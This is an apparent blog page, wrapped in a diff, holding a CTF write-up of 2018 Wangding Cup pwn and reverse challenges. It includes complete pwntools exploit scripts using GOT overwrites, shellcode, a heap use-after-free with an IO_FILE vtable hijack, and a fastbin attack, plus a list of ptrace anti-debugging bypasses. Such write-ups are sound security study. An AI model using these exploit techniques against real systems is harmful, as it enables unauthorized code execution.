@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>2018网鼎杯 | 风云阁</title>
+  <meta name="keywords" content=" Pwn , CTF ">
+  <meta name="description" content="2018网鼎杯 | 风云阁">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="@[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AFL基础">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="风云阁">
+<meta property="og:description" content="@[toc] Fuzzing 炼金路Lazy Pwner ☞ primelee  声明：以下仅作为笔记学习，不是作者原创。  开箱即用的佩剑 —— AFL make .  写栈溢出源码 gets(name)   插桩编译   创建初识语料库 echo &#39;Pwn me&#39; &gt;&gt; .&#x2F;input&#x2F;a.in Go fuzzing ! Oh no …   Fix it… sudo">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021513499-6493565.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021916706.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022711028.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022730604.png">
+<meta property="article:published_time" content="2020-04-10T04:35:49.741Z">
+<meta property="article:modified_time" content="2020-04-10T17:11:17.085Z">
+<meta property="article:author" content="枫云李">
+<meta property="article:tag" content="fuzz">
+<meta property="article:tag" content="afl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png">
+
+
+<link rel="icon" href="/img/avatar2.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar2.jpg" />
+</a>
+<div class="author">
+    <span>枫云李</span>
+</div>
+
+<div class="icon">
+    
+</div>
+
+
+
+<a class="more-menus">更多菜单</a>
+
+
+<ul>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            <li><div data-rel="CTF">CTF</div></li>
+        
+    
+        
+            <li><div data-rel="Fuzz">Fuzz</div></li>
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="22">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://blog.plusls.com/">师父</a></li>
+            
+            <li><a target="_blank" href="https://blog.xhyh.best/">潇晗宇浩</a></li>
+            
+            <li><a target="_blank" href="http://pzhxbz.cn/">pzhxbz</a></li>
+            
+            <li><a target="_blank" href="https://evi0s.com/">evi0s</a></li>
+            
+            <li><a target="_blank" href="https://enivs0rt.github.io/">enivS0rt</a></li>
+            
+            <li><a target="_blank" href="https://me.csdn.net/getsum">SuperGate</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CVE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">fuzz</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">afl</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Defcon</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">ruby</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">lang</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="ruby,lang"
+           data-author="" >
+            <span class="post-title" title="红宝石学习笔记">红宝石学习笔记</span>
+            <span class="post-date" title="2020-04-21 20:18:56">2020/04/21</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="2018网鼎杯">2018网鼎杯</span>
+            <span class="post-date" title="2020-04-15 00:00:00">2020/04/15</span>
+        </a>
+        
+        <a  class="Fuzz "
+           href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
+           data-tag="fuzz,afl"
+           data-author="" >
+            <span class="post-title" title="AFL基础">AFL基础</span>
+            <span class="post-date" title="2020-04-10 12:35:49">2020/04/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/05/CVEs/"
+           data-tag="Pwn,CVE"
+           data-author="" >
+            <span class="post-title" title="CVEs">CVEs</span>
+            <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/10/NullConCTF2020/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
+            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="强网杯2019">强网杯2019</span>
+            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/N1CTF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="安洵杯2019">安洵杯2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/11/07/Advance-rop/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Advance-rop">Advance-rop</span>
+            <span class="post-date" title="2019-11-07 09:50:48">2019/11/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/10/20/heap_details/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="heap_details">heap_details</span>
+            <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/10/12/RoarCTF-2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
+            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/22/Pwner/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwner">pwner</span>
+            <span class="post-date" title="2019-07-22 00:00:00">2019/07/22</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/18/tmux/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="tmux">tmux</span>
+            <span class="post-date" title="2019-07-18 00:00:00">2019/07/18</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/11/server_misc/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="server_misc">server_misc</span>
+            <span class="post-date" title="2019-07-11 00:00:00">2019/07/11</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/07/git_handbook/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="git handbook">git handbook</span>
+            <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/26/assembly/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="assembly">assembly</span>
+            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/10/pwning/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwning">pwning</span>
+            <span class="post-date" title="2019-05-10 00:00:00">2019/05/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/01/finance/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="finance">finance</span>
+            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/05/01/Defcon2019Q/"
+           data-tag="Pwn,CTF,Defcon"
+           data-author="" >
+            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
+            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/shellcode/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="shellcode">shellcode</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/elf_protector/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="elf_protector">elf_protector</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/04/29/StarCTF/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="StarCTF">StarCTF</span>
+            <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-2018网鼎杯" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">2018网鼎杯</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">Pwn</a>
+            
+            <a class="color4">CTF</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-04-21 22:11:24'>2020-04-15 00:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2018网鼎杯"><span class="toc-text">2018网鼎杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note2"><span class="toc-text">note2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soEasy"><span class="toc-text">soEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pesp"><span class="toc-text">pesp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Revrese"><span class="toc-text">Revrese</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-like-pack"><span class="toc-text">i_like_pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre"><span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleSMC"><span class="toc-text">SimpleSMC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯RE考点"><span class="toc-text">网鼎杯RE考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逆向例题"><span class="toc-text">逆向例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#知识点"><span class="toc-text">知识点</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="2018网鼎杯"><a href="#2018网鼎杯" class="headerlink" title="2018网鼎杯"></a>2018网鼎杯</h1><p>[toc]</p>
+<p><div class='inner-toc'><h2>目录</h2><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2018网鼎杯"><span class="toc-text">2018网鼎杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note2"><span class="toc-text">note2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soEasy"><span class="toc-text">soEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pesp"><span class="toc-text">pesp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Revrese"><span class="toc-text">Revrese</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-like-pack"><span class="toc-text">i_like_pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre"><span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleSMC"><span class="toc-text">SimpleSMC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网鼎杯RE考点"><span class="toc-text">网鼎杯RE考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逆向例题"><span class="toc-text">逆向例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#知识点"><span class="toc-text">知识点</span></a></li></ol></li></ol></li></ol></div></p>
+<p>今年网鼎杯5月10日开赛。第一届在前年举办，参赛队伍众多，堪称网络安全”奥运会“。谷歌了一圈，第三场的 Pwn Writeup 不齐全。第三场有4道题目。有两道题目比较有趣，写一篇博文记录心得。 </p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>下标溢出+改puts_got+写shellcode。</p>
+<pre><code class="python">from pwn import  * 
+import primedbg
+context.log_level=&#39;debug&#39;
+io=process(&#39;./deathnote&#39;)
+if len(sys.argv)&gt;1 and sys.argv[1]==&#39;dbg&#39;:
+    primedbg.p_attach_dbg(io,[0x00011E9])
+def cmd(idx):
+    global io; io.sendlineafter(&#39;hoice&gt;&gt;&#39;,str(idx))
+
+def add(idx,sz,c):
+    global io; cmd(1)
+    io.sendlineafter(&#39;Page:&#39;,str(idx))
+    io.sendlineafter(&#39;Size:&#39;,str(sz))
+    io.recvuntil(&#39;Name:&#39;)
+    io.send(c)
+
+def show(idx):
+    global io; cmd(3)
+    io.sendlineafter(&#39;Page:&#39;,str(idx)   )
+
+def free(idx):
+    global io; cmd(2)
+    io.sendlineafter(&#39;Page:&#39;,str(idx))
+
+io.sendlineafter(&#39; me your name:&#39;,&#39;/bin/sh\x00&#39;)
+sc1=asm(&#39;xor eax, eax&#39;) + &#39;\xeb\x1c&#39; # jmp 0x20
+sc2=asm(&#39;mov al, 0x3b&#39;) + &#39;\xeb\x1c&#39; # jmp 0x20
+sc3=asm(&#39;syscall;ret&#39;) + &#39;\x00&#39; 
+sc4=asm(&#39;xor edx, edx&#39;)+&#39;\xeb\x9c&#39; # jmp -0x60 (jmp back to sc1)
+
+add(0,4,sc1)
+add(0,4,sc2)
+add(0,4,sc3)
+add(0x100000000-25,4,sc4) #puts_got
+#primedbg.p_attach_dbg(p,[0x0001238],{&#39;page&#39;:0x2020E0})
+show(0x100000000 - 4)
+
+
+io.interactive()
+</code></pre>
+<h3 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h3><p><strong>分析程序</strong></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415105527230.png" alt="保护机制"></p>
+<p>保护选项全部开启。 </p>
+<p>RELRO等级为FULL，GOT表劫持不可行。 FORTIFY 开启，格式化字符串优化了。</p>
+<p>PIE 开启，ELF在内存中的地址随机了。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415110504350.png" alt="运行程序"></p>
+<p>题目输出内容和第一题 deathnote 差不多。 Write Delete Exit 三个功能。 </p>
+<p>IDA 静态分析一番后，我发现作者在堆管理相比于第一版的管理机制增加了一些特点，安全性提高。但毕竟低级的 堆管理还是很脆弱的。 以前分析过 glibc 的堆管理源码的人都晓得，代码量巨多、堆块检查多样、数据结构设计的精巧。 这道题目堆管理的机制确实比glibc的低级很多。 好了，不说这么多口水话了，逆向分析审计逻辑。</p>
+<p>low_malloc_func 分析。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415111251913.png" alt="low_malloc_func-1"></p>
+<p> 内存块小于0x70字节的申请从 xmmword_202120 链表中获得。这个链表是一个低级版本的fastbin。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415111522133.png" alt="low_malloc_func-2"></p>
+<p>申请空间大于0x70的从另一个空闲bin中获得，这里模拟了glibc unsortedbin，我随手命名成 largebin 了。这里的bin是单链表，遇到足够大的内存块就取下来。 注意最后一行，szie 字段最低位没有置1以示占用。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112027183.png" alt="low_malloc_func-3"></p>
+<p>两个bin都没有则从 topchunk 中获得。</p>
+<p>接下来分析 low_free_func。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112214299.png" alt="low_free_func-1"></p>
+<p>小块放入fastbin</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112255131.png" alt="low_free_func-2"></p>
+<p>相邻下一个chunk正好是top时，当前chunk和top合并。末位清零。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112413083.png" alt="low_free_func-3"></p>
+<p>相邻下一个chunk不为top且占用时，直接放入largebin</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112500837.png" alt="image-20200415112500837"></p>
+<p>相邻下一个chunk不为top且为占用，合并。</p>
+<p><strong>漏洞分析</strong></p>
+<p>方才说到 low_malloc 函数有一处分配的 chunk 没有标记占用，此为漏洞点一。 漏洞点二在于 low_free 函数合并相邻下一个chunk时未 unlink 对应的 chunk。这里我利用漏洞点二进行攻击</p>
+<p><strong>攻击思路</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 漏洞点二造成UAF、篡改 fd 字段。</li>
+<li><input disabled type="checkbox"> 由于堆管理机制低级，未做有效检查，实现任意地址分配。</li>
+<li><input disabled type="checkbox"> 任意地址读写。</li>
+</ul>
+<p>程序开了PIE，堆管理的内存块没有指向 ELF 的符号或 libc 的符号。这里有一点需要注意。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/A36095D72B8EB2F5E57AADAAB011A196.jpg" alt="vmmap"></p>
+<p>mmap 返回的内存地址与 libc.so 的基地址是一个固定值。</p>
+<p>这样通过泄露 chunk 的 fd，来确定基地址。这样一来就确定了 one_gadgets 和 _IO_2_1_stdout 。</p>
+<p>GOT表劫持行不通，没有hook可写。IO_FILE 有一处 vtable 函数表，可以篡改。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113625535.png" alt="rw-p 页可写"></p>
+<p><strong>分析 puts 函数</strong> </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113806831.png" alt="ioputs.c"></p>
+<p>根据逻辑短路，直接跳进 _IO_sputn() 。 （推荐用 vs code 查看源码。</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113930530.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113949168.png" alt></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415114013078.png" alt></p>
+<p>好了，没有任何检查，直接行动！</p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415114044935.png" alt="_IO_jump_t"></p>
+<p>__xsputn 偏移8个指针。伪造就完事了。</p>
+<p><strong>Pwned!</strong></p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415114244732.png" alt></p>
+<p><strong>exp</strong></p>
+<pre><code class="python">from pwn import * 
+from primedbg import * 
+import sys
+p=process(&#39;./deathnote2_new&#39;)
+context.arch=&#39;amd64&#39;
+
+fastbin=0x00202120
+largebin=0x000202168
+
+def cmd(i):
+    global p; p.sendlineafter(&#39;choice&gt;&gt;&#39;,str(i))
+
+def add(sz,c):
+    global p; cmd(1)
+    p.sendlineafter(&#39;Size:&#39;,str(sz))
+    p.sendafter(&quot;Name:&quot;,c)
+
+def free(i):
+    global p; cmd(2)
+    p.sendlineafter(&#39;Page:&#39;,str(i))
+
+def show(i):
+    global p; cmd(3)
+    p.sendlineafter(&#39;Page:&#39;,str(i))
+# brk points #show 0x001190 ; #add ret 0x0E7B
+if len(sys.argv)&gt;1:
+    attach_dbg_pie(p,[0x0001190 ],{&#39;list&#39;:0x0202060,&#39;fastbin&#39;:fastbin,&#39;largebin&#39;:largebin})
+
+
+#pause()
+p.sendline(&#39;/bin/sh&#39;)
+add(0x20,&#39;#0\n&#39;)
+add(0x80,&#39;#1\n&#39;)
+add(0x20,&#39;#2\n&#39;)
+add(0x20,&#39;#3\n&#39;)
+add(0x20,&#39;#4\n&#39;)
+
+free(3)
+free(2)
+free(1)
+#show(0)
+add(0x98,&#39;a&#39;*0x90+&#39;a&#39;*8) #1
+show(1)
+p.recvuntil(&#39;a&#39;*0x98)
+heap=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+heap&gt;&gt;=12; heap&lt;&lt;=12
+print(&#39;heap&#39;,hex(heap))
+libc=heap-6201344
+print(hex(libc))
+stdout_vtable=3954424+libc-0x10
+
+vtable=flat([
+    0,0,0,0,0,0,0,
+    0x4526a+libc
+])
+add(0x100,vtable+&#39;\n&#39;) #2
+fvtable=heap+0x1b0
+
+free(1)
+add(0xc0,&#39;a&#39;*0x90+p64(0x40)+p64(stdout_vtable)+&#39;\n&#39;) #1
+add(0x20,&#39;#3\n&#39;) #3
+show(0) # 2nd
+add(0x20,p64(fvtable)+&#39;\n&#39;) #4
+# show(0)
+
+
+p.interactive()</code></pre>
+<h3 id="soEasy"><a href="#soEasy" class="headerlink" title="soEasy"></a>soEasy</h3><p>真的easy</p>
+<pre><code class="python">from pwn import * 
+from primedbg import *
+#context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+io=process(&#39;./pwn&#39;)
+io.recvuntil(&#39;-&gt;&#39;)
+buf_addr=int(io.recv(10),16)
+print(hex(buf_addr))
+sc = &#39;&#39;
+sc += &#39;push 0x68732f\n&#39;
+sc += &#39;push 0x6e69622f\n&#39;
+sc +=  &#39;mov ebx, esp\n&#39;
+sc += &#39;xor ecx, ecx\n&#39;
+sc += &#39;xor edx, edx\n&#39;
+sc += &#39;push 0xb\n&#39;
+sc += &#39;pop eax\n&#39;
+sc += &#39;int 0x80\n&#39;
+sc=asm(sc)
+sc=sc+(0x4c-len(sc))*chr(0x90)+p32(buf_addr)+&#39;\n&#39;   
+print(len(sc))
+io.send(sc)
+io.interactive()</code></pre>
+<h3 id="pesp"><a href="#pesp" class="headerlink" title="pesp"></a>pesp</h3><p>fastbin attack 堆溢出 改写 item_list 指针实现任意地址读写。</p>
+<pre><code>from pwn import * 
+import primedbg
+import sys
+p=process(&#39;./pwn_new&#39;)
+context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+team=0x0006020C8
+item=0x06020C0 
+
+def cmd(i):
+    global p; p.sendlineafter(&#39;Your choice:&#39;,str(i))
+
+def add(sz,c):
+    global p; cmd(2)
+    p.sendlineafter(&#39;f servant name:&#39;,str(sz))
+    p.sendafter(&#39;ame of servant:&#39;,c)
+
+def edit(i,sz,c):
+    global p; cmd(3)
+    p.sendlineafter(&#39;servant:&#39;,str(i))
+    p.sendlineafter(&#39; servant name:&#39;,str(sz))
+    p.sendlineafter(&#39;ew name of the servnat:&#39;,str(c))
+
+def show():
+    cmd(1)
+
+def free(i):
+    global p; cmd(4)
+    p.sendlineafter(&#39;servant:&#39;,str(i))
+
+add(0x28,&#39;#0\n&#39;)
+add(0x28,&#39;#1\n&#39;) #1
+add(0x28,&#39;#2\n&#39;) #2
+add(0x31,&#39;top\n&#39;) #3
+free(1)
+edit(0,0x100,&#39;a&#39;*0x28+p64(0x31)+p64(item+16*3-8)+&#39;\n&#39;)
+edit(0,0x28,&#39;/bin/sh\x00&#39;) #0
+add(0x28,&#39;#1\n&#39;)
+
+
+add(0x28,p64(0x602018)+p64(0x31)+p64(0x0602068)) #4 key #3
+show()
+if len(sys.argv)&gt;1:
+    primedbg.attach_dbg(p,[0x0400C4B ],{&#39;team&#39;:team})
+p.recvuntil(&#39;3 : &#39;)
+
+m=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+puts_off=m-p.libc.address
+libcbase=m-0x844f0
+print(&#39;base&#39;,hex(libcbase))
+pause()
+edit(4,0x8,p64(libcbase+0xf1147))
+cmd(4)
+p.interactive()
+</code></pre><h2 id="Revrese"><a href="#Revrese" class="headerlink" title="Revrese"></a>Revrese</h2><h3 id="i-like-pack"><a href="#i-like-pack" class="headerlink" title="i_like_pack"></a>i_like_pack</h3><p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417171730687.png" alt="upx加壳"></p>
+<p>checksec 程序明显加壳了。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417171847110.png" alt></p>
+<p>脱壳失败，据一篇博文说可能upx的特征值被修改了（做完题后考证），导致无法用工具脱壳。无奈另寻出路了。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417172048242.png" alt></p>
+<p>加了反调试。  gdb 调试用了ptrace ，这里应该关闭了。 </p>
+<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200417172316825.png" alt></p>
+<pre><code>% strace ./re </code></pre><p>查看系统调用，意料之中。 </p>
+<blockquote>
+<p>bypass ptrace 常见方法</p>
+<ul>
+<li>方法一，不使用ptrace调试器（gdb就是基于ptrace机制）</li>
+<li>方法二，将ptrace部分patch掉</li>
+<li>方法三，通过LD_PRELOAD环境变量将可执行文件执行自己写的ptrace函数</li>
+<li>方法四，通过catch syscall ptrace下，然后修改ptrace返回值</li>
+</ul>
+</blockquote>
